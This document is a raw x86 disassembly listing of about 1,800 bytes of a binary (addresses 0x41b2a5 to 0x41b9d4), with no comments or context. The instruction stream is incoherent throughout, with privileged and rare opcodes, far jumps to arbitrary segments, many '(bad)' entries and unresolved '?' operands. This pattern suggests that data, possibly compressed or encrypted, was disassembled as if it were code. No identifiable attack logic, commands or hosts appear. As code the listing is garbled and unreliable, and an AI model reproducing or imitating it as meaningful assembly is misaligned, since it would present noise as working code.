  41b2a5:	sub    ecx,DWORD PTR [ebx+edi*1]
  41b2a8:	icebp  
  41b2a9:	jmp    0x47a8:0x876bada5
  41b2b0:	ja     0x41b286
  41b2b2:	loopne 0x41b258
  41b2b4:	lods   eax,DWORD PTR ds:[esi]
  41b2b5:	hlt    
  41b2b6:	and    esp,DWORD PTR [edi-0x29]
  41b2b9:	pop    edi
  41b2ba:	scas   al,BYTE PTR es:[edi]
  41b2bb:	fst    DWORD PTR [ebx]
  41b2bd:	test   BYTE PTR [eax+0x7bb5e37d],0x57
  41b2c4:	popa   
  41b2c5:	add    DWORD PTR [ebx],0x10
  41b2c8:	idiv   BYTE PTR [esi+edx*4-0x18]
  41b2cc:	nop
  41b2cd:	push   ebp
  41b2ce:	or     al,0x63
  41b2d0:	inc    ecx
  41b2d1:	into   
  41b2d2:	icebp  
  41b2d3:	jmp    0xae81ae9f
  41b2d8:	ror    BYTE PTR [esp+eiz*8+0x47],0xea
  41b2dd:	repz sub DWORD PTR [ecx],ebp
  41b2e0:	outs   dx,DWORD PTR ds:[esi]
  41b2e1:	sahf   
  41b2e2:	jle    0x41b2c5
  41b2e4:	rol    DWORD PTR [eax+0xa],1
  41b2e7:	pop    ss
  41b2e8:	fstp   QWORD PTR [edx-0x4c]
  41b2eb:	cli    
  41b2ec:	js     0x41b32b
  41b2ee:	mov    al,0x51
  41b2f0:	pop    ebp
  41b2f1:	xchg   esi,eax
  41b2f2:	out    dx,al
  41b2f3:	cld    
  41b2f4:	aam    0x95
  41b2f6:	call   0xf129a3d6
  41b2fb:	push   eax
  41b2fc:	imul   dh
  41b2fe:	or     al,0x75
  41b300:	or     BYTE PTR [ebx],ah
  41b302:	xchg   ebx,eax
  41b303:	and    al,bl
  41b305:	mov    ds:0x473091b4,al
  41b30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b30b:	gs push es
  41b30d:	cmp    eax,esp
  41b30f:	adc    al,0xcf
  41b311:	jle    0x41b33d
  41b313:	(bad)  
  41b314:	je     0x41b347
  41b316:	call   0x381c:0x3ca1de7d
  41b31d:	rcr    ebp,0xb8
  41b320:	mov    al,ds:0xadce654
  41b325:	(bad)  
  41b326:	scas   al,BYTE PTR es:[edi]
  41b327:	rcr    BYTE PTR [esi],0xc7
  41b32a:	sbb    edi,esi
  41b32c:	or     al,0xe6
  41b32e:	fld    QWORD PTR [edx+0x3]
  41b331:	cmp    BYTE PTR [ebx],ch
  41b333:	mov    al,bh
  41b335:	das    
  41b336:	cmp    DWORD PTR [ecx+eax*1],edi
  41b339:	nop
  41b33a:	lock mov edx,0x4c4a1b41
  41b340:	rcl    bl,0x49
  41b343:	mov    cl,0x5a
  41b345:	or     eax,0x643c12d0
  41b34a:	repz inc edi
  41b34c:	(bad)  
  41b34d:	loope  0x41b3c9
  41b34f:	cdq    
  41b350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b351:	push   esp
  41b352:	pop    ebp
  41b353:	xchg   edi,eax
  41b354:	mov    cl,0xd1
  41b356:	cmp    al,0x45
  41b358:	push   ebp
  41b359:	mov    ch,0x53
  41b35c:	mov    ah,ch
  41b35e:	sbb    DWORD PTR [ebx+0x48],eax
  41b361:	imul   edi,DWORD PTR [ecx-0x3c],0x418a8249
  41b368:	and    BYTE PTR [ebp-0x30],0xab
  41b36c:	not    ecx
  41b36e:	mov    ?,WORD PTR [edx-0x67bde5]
  41b374:	repz or ch,cl
  41b377:	les    esp,FWORD PTR [edi+0x5c]
  41b37a:	dec    ebx
  41b37b:	and    al,0x75
  41b37d:	dec    eax
  41b37e:	iret   
  41b37f:	inc    eax
  41b380:	xchg   esp,eax
  41b381:	enter  0xfae4,0x43
  41b385:	mov    ebp,0xc0e6f63e
  41b38a:	enter  0x8992,0xb
  41b38e:	mov    fs,ecx
  41b390:	cmc    
  41b391:	jns    0x41b3e8
  41b393:	mov    ds:0x17674788,al
  41b398:	dec    edi
  41b399:	fmul   st,st(2)
  41b39b:	mov    edi,0x6d35672d
  41b3a0:	xchg   esi,eax
  41b3a1:	mov    BYTE PTR [eax],dl
  41b3a3:	fldcw  WORD PTR [ecx]
  41b3a5:	inc    esi
  41b3a6:	ja     0x41b424
  41b3a8:	add    eax,0x267e5e9d
  41b3ad:	(bad)  
  41b3ae:	iret   
  41b3af:	fldcw  WORD PTR [bp+si]
  41b3b2:	imul   edi
  41b3b4:	jg     0x41b3db
  41b3b6:	lock lea ebp,[esi+ebp*1+0xd]
  41b3bb:	and    edx,esp
  41b3bd:	int3   
  41b3be:	cmc    
  41b3bf:	jns    0x41b437
  41b3c1:	les    ecx,FWORD PTR [ebx+0x8]
  41b3c4:	jns    0x41b416
  41b3c6:	jp     0x41b3d5
  41b3c8:	dec    edx
  41b3c9:	scas   al,BYTE PTR es:[edi]
  41b3ca:	aad    0xf
  41b3cc:	pop    eax
  41b3cd:	sti    
  41b3ce:	push   cs
  41b3cf:	(bad)  
  41b3d0:	jl     0x41b44d
  41b3d2:	inc    esp
  41b3d3:	std    
  41b3d4:	mov    ah,0x7b
  41b3d6:	dec    esi
  41b3d7:	imul   edi,DWORD PTR [edi-0x45],0x25775c06
  41b3de:	shr    BYTE PTR [edx+0x1c],1
  41b3e1:	adc    ch,BYTE PTR [edx+0x6]
  41b3e4:	jle    0x41b3be
  41b3e6:	mov    cl,0x18
  41b3e8:	xchg   esp,eax
  41b3e9:	lahf   
  41b3ea:	test   dh,dh
  41b3ec:	mov    dl,0x62
  41b3ee:	lea    esi,ds:0x4c23ee39
  41b3f4:	loop   0x41b427
  41b3f6:	in     eax,0x3c
  41b3f8:	pop    esp
  41b3f9:	xor    DWORD PTR [ebp-0x58],edi
  41b3fc:	adc    ecx,DWORD PTR [ebx+0x5e]
  41b3ff:	jo     0x41b411
  41b401:	jecxz  0x41b428
  41b403:	in     al,dx
  41b404:	mov    bh,0x7e
  41b406:	jno    0x41b3d8
  41b408:	xor    eax,0x10a8bfdc
  41b40d:	mov    edi,0xc01e3c8d
  41b413:	jp     0x41b416
  41b415:	or     ebx,esp
  41b417:	xchg   DWORD PTR [ebx-0x59606e51],eax
  41b41d:	outs   dx,DWORD PTR ds:[esi]
  41b41e:	or     al,0xbf
  41b420:	sbb    eax,0x738109ab
  41b425:	repz adc DWORD PTR [edi-0x74],0x83a64361
  41b42d:	dec    esi
  41b42e:	adc    eax,0x32fa82aa
  41b433:	mov    bl,0xc9
  41b435:	jo     0x41b401
  41b437:	jb     0x41b3dc
  41b439:	xchg   DWORD PTR [ebx+0xf896219],edx
  41b43f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b440:	pop    esi
  41b441:	pop    esi
  41b442:	mov    dl,0x9a
  41b444:	inc    esi
  41b445:	enter  0x57fa,0xe0
  41b449:	pop    ebx
  41b44a:	pop    esp
  41b44b:	push   cs
  41b44c:	int3   
  41b44d:	mov    ch,0xd4
  41b44f:	hlt    
  41b450:	mov    eax,0xf11e7af5
  41b455:	mov    al,ds:0x96cc2f3b
  41b45a:	sub    eax,ebp
  41b45c:	scas   al,BYTE PTR es:[edi]
  41b45d:	jge    0x41b478
  41b45f:	pop    ds
  41b460:	adc    DWORD PTR [ebp+0x51],esp
  41b463:	push   es
  41b464:	push   ebp
  41b465:	shl    DWORD PTR [edi-0x5],cl
  41b468:	push   0xffffffa9
  41b46a:	jp     0x41b451
  41b46c:	pop    ebp
  41b46d:	in     eax,0x99
  41b46f:	in     al,0xd9
  41b471:	adc    edx,edx
  41b473:	mov    edi,0x61a38d1a
  41b478:	add    ch,cl
  41b47a:	adc    DWORD PTR [ebp-0x28],edx
  41b47d:	ins    BYTE PTR es:[edi],dx
  41b47e:	mov    cl,0x5e
  41b480:	jmp    0x8969:0x7a59efdc
  41b487:	adc    eax,0x84b42df
  41b48c:	aas    
  41b48d:	adc    edx,DWORD PTR [esi+0x2]
  41b490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b491:	dec    ebx
  41b492:	cmp    eax,0xf972eb9
  41b497:	fadd   DWORD PTR [edx]
  41b499:	pop    esi
  41b49a:	xchg   esi,eax
  41b49b:	fwait
  41b49c:	mov    dl,0x6a
  41b49e:	mov    dl,0xc5
  41b4a0:	or     BYTE PTR [ebp-0x53ab1012],cl
  41b4a6:	ins    BYTE PTR es:[edi],dx
  41b4a7:	mov    al,ds:0xb95a466
  41b4ac:	and    BYTE PTR [ecx+0x1f],ah
  41b4af:	sahf   
  41b4b0:	cmp    DWORD PTR [edx],ebx
  41b4b2:	jl     0x41b4df
  41b4b4:	(bad)  [edi]
  41b4b6:	cmp    eax,esp
  41b4b8:	cli    
  41b4b9:	mov    cl,0xb8
  41b4bb:	jecxz  0x41b52a
  41b4bd:	cmp    eax,0x96e25267
  41b4c2:	mov    dl,BYTE PTR ds:0x6f7ac6f1
  41b4c8:	mov    al,ds:0x32bade09
  41b4cd:	add    al,cl
  41b4cf:	arpl   WORD PTR [ebp+eiz*4-0x55446440],bp
  41b4d6:	scas   al,BYTE PTR es:[edi]
  41b4d7:	neg    BYTE PTR [edx+0x7b]
  41b4da:	ins    BYTE PTR es:[edi],dx
  41b4db:	mov    esp,fs
  41b4dd:	test   al,0xc6
  41b4df:	mov    cl,0x94
  41b4e1:	test   al,0x8a
  41b4e3:	cmp    dl,BYTE PTR [esi+eax*4+0x55]
  41b4e7:	mov    DWORD PTR [eax+0x13],ecx
  41b4ea:	fnstcw WORD PTR [edx+0x56bdb6c5]
  41b4f0:	inc    ebx
  41b4f1:	mov    dl,BYTE PTR [ecx-0x22e2564f]
  41b4f7:	lds    esp,FWORD PTR [eax]
  41b4f9:	outs   dx,DWORD PTR ds:[esi]
  41b4fa:	lea    esi,[esi]
  41b4fc:	or     eax,0x4a1946d1
  41b501:	sbb    DWORD PTR [edi],ecx
  41b503:	fistp  QWORD PTR [edi+0x67]
  41b506:	mov    bh,BYTE PTR [edx+ebx*2-0x7a]
  41b50a:	add    al,BYTE PTR [edi]
  41b50c:	push   esi
  41b50d:	retf   0x5d0
  41b510:	add    cl,ah
  41b512:	test   BYTE PTR [ebx+0x40b074b5],bl
  41b518:	xchg   esi,eax
  41b519:	pop    ebp
  41b51a:	arpl   WORD PTR [esi],sp
  41b51c:	ds jmp 0x3d71:0x441fc9f9
  41b524:	xor    eax,0xcfa138a
  41b529:	retf   0xa331
  41b52c:	xchg   ecx,eax
  41b52d:	sub    bl,cl
  41b52f:	gs xchg ecx,eax
  41b531:	mov    bl,0xda
  41b533:	xchg   esi,eax
  41b534:	enter  0x79d1,0xd0
  41b538:	stos   DWORD PTR es:[edi],eax
  41b539:	aad    0x97
  41b53b:	fs aas 
  41b53d:	(bad)  [ebx]
  41b53f:	cmp    ecx,DWORD PTR [ecx+0x56f81883]
  41b545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b546:	add    BYTE PTR [ebp-0x16133619],ah
  41b54c:	lea    esi,[edi]
  41b54e:	sbb    al,0x52
  41b550:	mov    ds:0xccb9384b,eax
  41b555:	mov    al,0x5a
  41b557:	hlt    
  41b558:	mov    al,BYTE PTR [ecx]
  41b55a:	pop    esi
  41b55b:	xchg   esi,eax
  41b55c:	call   0xa9a1cc8f
  41b561:	jecxz  0x41b562
  41b563:	mov    edi,0x478aaeea
  41b568:	out    dx,eax
  41b569:	jne    0x41b5b9
  41b56b:	or     al,0x51
  41b56d:	leave  
  41b56e:	xor    DWORD PTR [edx+edi*2],esp
  41b571:	(bad)  
  41b572:	int    0x9a
  41b574:	dec    esi
  41b575:	jp     0x41b575
  41b577:	and    ecx,ecx
  41b579:	xchg   ecx,eax
  41b57a:	mov    cs,WORD PTR ds:0xae8943d4
  41b580:	xchg   edi,eax
  41b581:	push   ds
  41b582:	dec    edi
  41b583:	fsub   st,st(3)
  41b585:	pop    ss
  41b586:	push   cs
  41b587:	fst    QWORD PTR [esp+esi*2-0x64f18313]
  41b58e:	fcmovne st,st(7)
  41b590:	xchg   edx,eax
  41b591:	call   0xa389:0x7cea968d
  41b598:	or     esi,DWORD PTR [edi+0x1]
  41b59b:	stc    
  41b59c:	dec    esi
  41b59d:	outs   dx,BYTE PTR ds:[esi]
  41b59e:	retf   0xaec8
  41b5a1:	fst    DWORD PTR [ebp+0x6f7f3221]
  41b5a7:	jnp    0x41b611
  41b5a9:	scas   al,BYTE PTR es:[edi]
  41b5aa:	cwde   
  41b5ab:	(bad)  
  41b5ac:	sar    edx,cl
  41b5ae:	xchg   esp,eax
  41b5af:	sbb    eax,ebp
  41b5b1:	rep stos DWORD PTR es:[edi],eax
  41b5b3:	xchg   BYTE PTR [edx],dh
  41b5b5:	out    0xee,eax
  41b5b7:	pushf  
  41b5b8:	in     al,dx
  41b5b9:	retf   0xbd
  41b5bc:	pop    ss
  41b5bd:	xchg   edx,eax
  41b5be:	push   eax
  41b5bf:	add    al,0xab
  41b5c1:	and    BYTE PTR [edi+eiz*1],0x28
  41b5c5:	mov    ebp,0xe5345645
  41b5ca:	mov    edx,0x9590d78a
  41b5cf:	or     DWORD PTR [edx-0x2ac23bba],0x25
  41b5d6:	add    DWORD PTR [eax+0x35],edx
  41b5d9:	out    dx,al
  41b5da:	popa   
  41b5db:	out    0x1d,al
  41b5dd:	int3   
  41b5de:	jmp    0x7ce8f99b
  41b5e3:	cmc    
  41b5e4:	(bad)  
  41b5e5:	xor    al,0x45
  41b5e7:	add    eax,DWORD PTR [esi]
  41b5e9:	clc    
  41b5ea:	jb     0x41b573
  41b5ec:	mov    esp,0x8802b4b7
  41b5f1:	adc    BYTE PTR [esi-0x65],bh
  41b5f4:	or     al,0xb2
  41b5f6:	cwde   
  41b5f7:	addr16 in eax,dx
  41b5f9:	(bad)  [ebx]
  41b5fb:	push   cs
  41b5fc:	arpl   WORD PTR [edi+eax*1],bx
  41b5ff:	jp     0x41b616
  41b601:	jno    0x41b5f4
  41b603:	ss mov bh,0x63
  41b606:	mov    al,ds:0xce5fa767
  41b60b:	push   cs
  41b60c:	pop    edx
  41b60d:	xor    BYTE PTR [ecx-0x1da3a5b2],ch
  41b613:	in     al,0x77
  41b615:	or     al,0xb5
  41b617:	mov    al,BYTE PTR [ecx+esi*4+0x2497d193]
  41b61e:	imul   edi,esp,0x43f66f58
  41b624:	xchg   ebx,eax
  41b625:	cdq    
  41b626:	xor    BYTE PTR [edi],ah
  41b628:	inc    esp
  41b629:	or     BYTE PTR [edx+edi*8+0x3a],ah
  41b62d:	pop    esp
  41b62e:	out    dx,al
  41b62f:	mov    esi,0xa94961c8
  41b634:	fdiv   DWORD PTR [ecx]
  41b636:	cmc    
  41b637:	out    0x5,al
  41b639:	cdq    
  41b63a:	arpl   dx,cx
  41b63c:	inc    esi
  41b63d:	cwde   
  41b63e:	mov    ebx,0x1b44514e
  41b643:	jmp    0x69e2:0xc13c14b6
  41b64a:	pop    ecx
  41b64b:	sbb    BYTE PTR [ecx+ecx*8+0x8],al
  41b64f:	xchg   esi,eax
  41b650:	xchg   edx,eax
  41b651:	push   edi
  41b652:	inc    esi
  41b653:	dec    edx
  41b654:	cmp    BYTE PTR [edi+esi*8+0x30bb742d],dl
  41b65b:	mov    edi,0x35608f57
  41b660:	pop    esp
  41b661:	test   ch,cl
  41b663:	out    0xd9,al
  41b665:	inc    ecx
  41b666:	add    ah,BYTE PTR [esi]
  41b668:	push   eax
  41b669:	inc    edi
  41b66a:	outs   dx,BYTE PTR ds:[esi]
  41b66b:	inc    BYTE PTR [eax]
  41b66d:	lock sti 
  41b66f:	adc    edx,DWORD PTR [edi+0x1e]
  41b672:	push   eax
  41b673:	leave  
  41b674:	xchg   DWORD PTR [edx+0x50],esi
  41b677:	cwde   
  41b678:	or     eax,0xbb2feec7
  41b67d:	xchg   BYTE PTR [eax-0xe],ch
  41b680:	xor    al,bl
  41b682:	and    eax,0x5ae69bc4
  41b687:	clc    
  41b688:	es push esp
  41b68a:	pop    edi
  41b68b:	sub    ebp,DWORD PTR [edi]
  41b68d:	cwde   
  41b68e:	mov    dl,0x9d
  41b690:	lods   eax,DWORD PTR ds:[esi]
  41b691:	or     BYTE PTR [ebp+0x450f6090],cl
  41b697:	mov    bh,0x6e
  41b699:	fdiv   st,st(4)
  41b69b:	xchg   edi,eax
  41b69c:	outs   dx,DWORD PTR ds:[esi]
  41b69d:	fwait
  41b69e:	and    al,0x65
  41b6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6a1:	jmp    0xf20ecbad
  41b6a6:	mov    WORD PTR [esi-0x65],?
  41b6a9:	les    eax,FWORD PTR [edi+0x4e]
  41b6ac:	bound  esp,QWORD PTR [ebp+0x24159a83]
  41b6b2:	stos   DWORD PTR es:[edi],eax
  41b6b3:	or     edx,DWORD PTR [edx]
  41b6b5:	xlat   BYTE PTR ds:[ebx]
  41b6b6:	out    0x93,eax
  41b6b8:	jge    0x41b6ed
  41b6ba:	jecxz  0x41b6a3
  41b6bc:	(bad)  
  41b6be:	mov    ecx,0x8187b65
  41b6c3:	or     al,0x92
  41b6c5:	pusha  
  41b6c6:	xchg   ecx,eax
  41b6c7:	xchg   ecx,eax
  41b6c8:	jecxz  0x41b71e
  41b6ca:	pop    edx
  41b6cb:	jp     0x41b695
  41b6cd:	jnp    0x41b69b
  41b6cf:	icebp  
  41b6d0:	mov    al,0xc5
  41b6d2:	xor    ch,bh
  41b6d4:	loopne 0x41b6c2
  41b6d6:	outs   dx,DWORD PTR ds:[esi]
  41b6d7:	adc    al,0xa1
  41b6d9:	jb     0x41b724
  41b6db:	dec    edi
  41b6dc:	mov    ebp,0x44fce36f
  41b6e1:	aaa    
  41b6e2:	dec    BYTE PTR [edi]
  41b6e4:	sub    ah,0x95
  41b6e7:	jno    0x41b6f5
  41b6e9:	icebp  
  41b6ea:	cs aas 
  41b6ec:	pusha  
  41b6ed:	jmp    0x41b6b0
  41b6ef:	jl     0x41b730
  41b6f1:	scas   al,BYTE PTR es:[edi]
  41b6f2:	out    dx,al
  41b6f3:	push   ds
  41b6f4:	fnstcw WORD PTR [esi+0x256fbcaa]
  41b6fa:	jnp    0x41b6a1
  41b6fc:	mov    WORD PTR [ecx-0x62c2fc4b],ss
  41b702:	sub    al,0xcf
  41b704:	lock test al,0x15
  41b707:	sar    DWORD PTR [ebx+0x4e],0x97
  41b70b:	pop    ebp
  41b70c:	xchg   esi,eax
  41b70d:	daa    
  41b70e:	fs into 
  41b710:	shl    DWORD PTR [ecx-0x2af4abf6],0x34
  41b717:	sbb    al,bh
  41b719:	push   es
  41b71a:	mov    eax,0x3a86da04
  41b71f:	jecxz  0x41b752
  41b721:	mov    ecx,0x73ea80f8
  41b726:	mov    dh,0x1
  41b728:	scas   al,BYTE PTR es:[edi]
  41b729:	or     edi,edx
  41b72b:	or     cl,ch
  41b72d:	lea    edi,[esi-0x5f]
  41b730:	mov    eax,0x84418e76
  41b735:	inc    ecx
  41b736:	cmp    al,0xf3
  41b738:	in     eax,0xd4
  41b73a:	inc    ecx
  41b73b:	jg     0x41b79d
  41b73d:	shr    DWORD PTR [edx+edx*1],1
  41b740:	mov    dh,bl
  41b742:	jbe    0x41b7bc
  41b744:	aam    0x41
  41b746:	inc    edi
  41b747:	push   eax
  41b748:	sub    dl,BYTE PTR [ebx]
  41b74a:	add    ebx,ecx
  41b74c:	pop    edi
  41b74d:	push   0x1
  41b74f:	js     0x41b768
  41b751:	or     bl,cl
  41b753:	jo     0x41b72a
  41b755:	jno    0x41b729
  41b757:	fmul   QWORD PTR [ecx]
  41b75a:	fdiv   DWORD PTR [esi]
  41b75c:	ret    0x5834
  41b75f:	aaa    
  41b760:	ja     0x41b792
  41b762:	jnp    0x41b7b2
  41b764:	test   ch,dh
  41b766:	pop    edx
  41b767:	fldenv [ebp-0x29f63896]
  41b76d:	jno    0x41b7ad
  41b76f:	pop    esp
  41b770:	inc    ebx
  41b771:	lds    ebp,FWORD PTR [edi+0x7f36c21a]
  41b777:	and    ch,BYTE PTR [esi-0x49]
  41b77a:	bnd jb 0x41b73e
  41b77d:	jge    0x41b78d
  41b77f:	in     eax,dx
  41b780:	outs   dx,BYTE PTR ds:[esi]
  41b781:	cwde   
  41b782:	push   cs
  41b783:	mov    cl,0xb5
  41b785:	jle    0x41b73f
  41b787:	sbb    al,0xf4
  41b789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b78a:	mov    DWORD PTR [esi+0x2fc29c34],edx
  41b790:	mov    esi,0x65bc1b80
  41b795:	xor    al,0xd1
  41b797:	and    cl,BYTE PTR [edx]
  41b799:	mov    ds:0x95a61c7,al
  41b79e:	mov    ebp,edi
  41b7a0:	mov    bl,0x6
  41b7a2:	test   bh,dl
  41b7a4:	lock aad 0xdb
  41b7a7:	mov    al,ds:0x78a1fc54
  41b7ac:	into   
  41b7ad:	sbb    DWORD PTR [edi-0x71b7af7c],ecx
  41b7b3:	inc    edx
  41b7b4:	lods   eax,DWORD PTR ds:[esi]
  41b7b5:	adc    ebx,ebx
  41b7b7:	stos   DWORD PTR es:[edi],eax
  41b7b8:	clc    
  41b7b9:	push   cs
  41b7ba:	jge    0x41b764
  41b7bc:	mov    WORD PTR [edi+0x5b],ss
  41b7bf:	loopne 0x41b747
  41b7c1:	mov    ah,0x81
  41b7c3:	mov    ecx,0x5bdaf4cd
  41b7c8:	mov    WORD PTR [edx+0x5a],ds
  41b7cb:	adc    eax,DWORD PTR [ebx+0x5107f787]
  41b7d1:	or     ebx,esi
  41b7d3:	addr16 pop ss
  41b7d5:	dec    eax
  41b7d6:	es xchg ebp,esp
  41b7d9:	jae    0x41b7d2
  41b7db:	sar    BYTE PTR [eax+ebp*2-0x1e],cl
  41b7df:	push   esp
  41b7e0:	call   0x4104:0x6c8d107a
  41b7e7:	out    dx,eax
  41b7e8:	mov    ?,WORD PTR [esi-0x5c7823f7]
  41b7ee:	dec    esp
  41b7ef:	(bad)  
  41b7f0:	out    dx,eax
  41b7f1:	test   eax,0xd7007bc7
  41b7f6:	lock adc BYTE PTR [ecx-0x3a],0xa5
  41b7fb:	sub    al,0xd4
  41b7fd:	sub    ebp,edx
  41b7ff:	add    al,0x74
  41b801:	mov    al,ds:0xe76bd797
  41b806:	jmp    0x4f9e9e91
  41b80b:	cmp    BYTE PTR [ecx-0x6b9db255],ch
  41b811:	call   0x3256:0x3bdaf5a3
  41b818:	ja     0x41b7c2
  41b81a:	pop    edx
  41b81b:	cld    
  41b81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b81d:	pop    eax
  41b81e:	sbb    esi,DWORD PTR [ebx+0x36]
  41b821:	and    BYTE PTR [ebx],dh
  41b823:	idiv   DWORD PTR [eax]
  41b825:	cdq    
  41b826:	mov    eax,0x9efdbc52
  41b82b:	cmp    al,0x54
  41b82d:	inc    ecx
  41b82e:	jle    0x41b809
  41b830:	rol    DWORD PTR [ecx],0x4d
  41b833:	push   DWORD PTR [edx+0x20ce874b]
  41b839:	cmc    
  41b83a:	outs   dx,BYTE PTR ds:[esi]
  41b83b:	add    eax,ebp
  41b83d:	jb     0x41b803
  41b83f:	xor    ebp,DWORD PTR [edi+0x7b]
  41b842:	mov    ebx,0x765f790
  41b847:	sbb    al,0xcb
  41b849:	jns    0x41b86a
  41b84b:	sub    al,BYTE PTR [esi]
  41b84d:	inc    edx
  41b84e:	sub    al,0xf5
  41b850:	into   
  41b851:	dec    edx
  41b852:	mov    ah,BYTE PTR [edx]
  41b854:	cli    
  41b855:	sbb    edx,edi
  41b857:	sub    eax,0x99d147b7
  41b85c:	dec    ebp
  41b85d:	adc    edi,ebx
  41b85f:	fidiv  WORD PTR [edi]
  41b861:	loopne 0x41b87c
  41b863:	inc    ebx
  41b864:	test   DWORD PTR [ebx],0x987e2b64
  41b86a:	mov    cl,BYTE PTR [ebx]
  41b86c:	pop    ds
  41b86d:	stos   DWORD PTR es:[edi],eax
  41b86e:	ret    0x72f4
  41b871:	push   0xa55c7390
  41b876:	mov    dl,0x99
  41b878:	mov    ebx,0x82730c4e
  41b87d:	or     BYTE PTR [ebx],ah
  41b87f:	stc    
  41b880:	repz imul ecx,DWORD PTR [ecx],0xffffffe2
  41b884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b885:	mov    WORD PTR [ecx-0x43],gs
  41b888:	aas    
  41b889:	test   eax,0xf776644c
  41b88e:	test   al,0x62
  41b890:	scas   eax,DWORD PTR es:[edi]
  41b891:	hlt    
  41b892:	sbb    al,0x51
  41b894:	adc    al,0x51
  41b896:	mov    dl,0xc6
  41b898:	xchg   ebp,eax
  41b899:	ror    BYTE PTR [eax+0x3fdb2e96],0xc0
  41b8a0:	cli    
  41b8a1:	xor    eax,DWORD PTR [ebx+0x71]
  41b8a4:	out    dx,al
  41b8a5:	mov    cl,0xc
  41b8a7:	lahf   
  41b8a8:	cs fwait
  41b8aa:	inc    esi
  41b8ab:	pop    es
  41b8ac:	inc    esi
  41b8ad:	(bad)  
  41b8ae:	ret    
  41b8af:	retf   0x78a7
  41b8b2:	jecxz  0x41b8d6
  41b8b4:	inc    ebx
  41b8b5:	test   BYTE PTR [edx+0x21],0x14
  41b8b9:	scas   al,BYTE PTR es:[edi]
  41b8ba:	mov    al,ds:0x83b40932
  41b8bf:	cwde   
  41b8c0:	adc    al,0x97
  41b8c2:	mov    cl,0xe6
  41b8c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8c5:	inc    edx
  41b8c6:	ret    0x6f8e
  41b8c9:	loopne 0x41b8d4
  41b8cb:	outs   dx,BYTE PTR ds:[esi]
  41b8cc:	cmp    cl,BYTE PTR [edx+0x32]
  41b8cf:	icebp  
  41b8d0:	and    ecx,esp
  41b8d2:	dec    ebp
  41b8d3:	mov    eax,ds:0x258a4a6b
  41b8d8:	imul   esi
  41b8da:	int    0x3
  41b8dc:	cs jne 0x41b862
  41b8df:	shl    BYTE PTR [ebx+ebx*4-0x5238318c],cl
  41b8e6:	dec    edi
  41b8e7:	repnz pop ds
  41b8e9:	ror    DWORD PTR [eax],0xb2
  41b8ec:	or     DWORD PTR [esi+0x63],ebx
  41b8ef:	xor    esi,DWORD PTR [edi]
  41b8f1:	mov    ch,0xe3
  41b8f3:	retf   0xc9e1
  41b8f6:	mov    DWORD PTR [edi+0x3c],esi
  41b8f9:	inc    edx
  41b8fa:	gs sub bh,ah
  41b8fd:	push   edx
  41b8fe:	scas   eax,DWORD PTR es:[edi]
  41b8ff:	mov    eax,ds:0x10ad9bb4
  41b904:	js     0x41b93d
  41b906:	in     al,0x85
  41b908:	ins    DWORD PTR es:[edi],dx
  41b909:	lds    ebp,FWORD PTR ds:0xe9e3d196
  41b90f:	inc    ebx
  41b910:	mov    ds,edx
  41b912:	bound  edi,QWORD PTR [ebx-0x79]
  41b915:	lods   eax,DWORD PTR ss:[esi]
  41b917:	sub    al,al
  41b919:	add    esi,DWORD PTR [esi+0x4ab4dabf]
  41b91f:	push   ss
  41b920:	int3   
  41b921:	mov    WORD PTR ds:0x1322f69b,?
  41b927:	ins    BYTE PTR es:[edi],dx
  41b928:	ins    DWORD PTR es:[edi],dx
  41b929:	inc    esp
  41b92a:	xchg   ebp,eax
  41b92b:	cmp    DWORD PTR [ebx-0x6e1fcff9],0xffffffac
  41b932:	int3   
  41b933:	idiv   DWORD PTR gs:[edi]
  41b936:	jge    0x41b8fd
  41b938:	pop    edi
  41b939:	loope  0x41b8dd
  41b93b:	fsubr  QWORD PTR ds:0x42d83738
  41b941:	push   ss
  41b942:	into   
  41b943:	aas    
  41b944:	sbb    edi,esi
  41b946:	or     DWORD PTR ds:0x869c11b7,edi
  41b94c:	adc    BYTE PTR [esi-0x46702ae8],dl
  41b952:	cmp    al,0xd9
  41b954:	lds    eax,FWORD PTR [ebx+0x61925b8c]
  41b95a:	popf   
  41b95b:	fs or  ebp,edi
  41b95e:	adc    BYTE PTR [ecx-0x16],ah
  41b961:	pop    eax
  41b962:	mov    dl,0x7
  41b964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b965:	jmp    DWORD PTR [edx-0x1c6bec39]
  41b96b:	xchg   edi,eax
  41b96c:	imul   edi,DWORD PTR [ecx-0x7815b384],0xffffff85
  41b973:	push   eax
  41b974:	mov    ch,0x90
  41b976:	mov    dl,0x18
  41b978:	sub    al,0xb0
  41b97a:	or     eax,0x16e938cc
  41b97f:	jno    0x41b94b
  41b981:	jbe    0x41b9fa
  41b983:	lea    esi,[esi+0x7e]
  41b986:	xor    eax,0x2370a66f
  41b98b:	rcl    dh,0xed
  41b98e:	scas   al,BYTE PTR es:[edi]
  41b98f:	mov    esi,0xb842b956
  41b994:	loopne 0x41b9fe
  41b996:	leave  
  41b997:	scas   eax,DWORD PTR es:[edi]
  41b998:	aam    0xab
  41b99a:	pop    ebx
  41b99b:	adc    ebx,DWORD PTR [edx+0x3b1d0a30]
  41b9a1:	dec    esp
  41b9a2:	pop    eax
  41b9a3:	je     0x41b9ed
  41b9a5:	and    al,dl
  41b9a7:	pop    esp
  41b9a8:	fldcw  WORD PTR [esi]
  41b9aa:	sub    eax,0x3dbeaf3b
  41b9af:	inc    edx
  41b9b0:	push   ss
  41b9b1:	push   cs
  41b9b2:	call   0x4fa55588
  41b9b7:	call   0xff71ecd8
  41b9bc:	xlat   BYTE PTR ds:[ebx]
  41b9bd:	pushf  
  41b9be:	jnp    0x41b994
  41b9c0:	pushf  
  41b9c1:	mov    bh,0x32
  41b9c3:	push   0x2926d49b
  41b9c8:	xchg   BYTE PTR [ebp-0x5c3b972f],bl
  41b9ce:	lahf   
  41b9cf:	mov    ebp,0x7fd5c923
  41b9d4:	xor    dh,BYTE PTR [edi+0x7a5f8a8c]
